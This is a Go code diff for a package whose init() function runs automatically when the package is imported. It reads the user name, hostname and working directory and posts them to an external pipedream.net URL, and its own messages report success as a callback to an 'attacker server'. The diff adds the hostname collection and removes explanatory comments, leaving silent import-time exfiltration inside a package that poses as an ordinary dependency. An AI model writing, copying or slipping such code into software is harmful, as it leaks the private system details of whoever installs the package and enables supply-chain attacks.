@@ -7,24 +7,25 @@ import (
 	"os"
 )
 
-// Dummy exported type (required for named import like `pb`)
 type Dummy struct{}
 
 func init() {
 	user := os.Getenv("USER")
+	hostname, _ := os.Hostname()
 	cwd, _ := os.Getwd()
+
 	data := url.Values{}
 	data.Set("user", user)
 	data.Set("cwd", cwd)
+	data.Set("host", hostname)
 
-	// Replace with your actual VPS URL
+	
 	vpsURL := "https://eou39l9f2i96s48.m.pipedream.net/poc"
 
-	// Send callback
 	_, err := http.PostForm(vpsURL, data)
 	if err != nil {
-		fmt.Println("[PoC] Failed to send data:", err)
+		fmt.Println("[PoC] Callback failed:", err)
 	} else {
-		fmt.Println("[PoC] Callback sent successfully to attacker server")
+		fmt.Println("[PoC] Callback sent to attacker server.")
 	}
 }
